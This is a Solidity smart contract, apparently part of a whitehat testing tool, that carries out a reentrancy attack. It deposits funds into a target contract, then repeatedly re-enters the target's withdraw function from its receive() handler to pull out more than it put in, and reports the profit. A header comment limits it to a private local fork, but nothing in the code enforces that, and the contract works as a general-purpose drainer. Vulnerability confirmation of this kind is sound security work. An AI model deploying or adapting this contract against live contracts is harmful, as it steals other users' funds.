// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Used ONLY by WHITEHAT on a private local fork to confirm reentrancy on a target that this
/// tool controls a copy of. Never deployed to a live network. It deposits a small amount, then
/// re-enters the target's withdraw function from receive(). If it ends with more than it put in,
/// the target let it withdraw other users' funds.
contract ReentrancyAttacker {
    address public target;
    bytes public depositCalldata;
    bytes public withdrawCalldata;
    uint256 public startBalance;
    uint256 public depth;
    bool public armed;

    function run(address _target, bytes calldata _deposit, bytes calldata _withdraw) external payable {
        target = _target;
        depositCalldata = _deposit;
        withdrawCalldata = _withdraw;
        startBalance = address(this).balance;
        armed = true;
        (bool ok, ) = _target.call{value: msg.value}(_deposit);
        require(ok, "deposit failed");
        (bool ok2, ) = _target.call(_withdraw);
        require(ok2, "withdraw failed");
        armed = false;
    }

    // Returns net profit in wei (0 if none).
    function profit() external view returns (uint256) {
        return address(this).balance > startBalance ? address(this).balance - startBalance : 0;
    }

    receive() external payable {
        if (armed && depth < 10 && target.balance >= 1) {
            depth++;
            (bool ok, ) = target.call(withdrawCalldata);
            ok; // ignore; last reentry may revert when drained
        }
    }
}
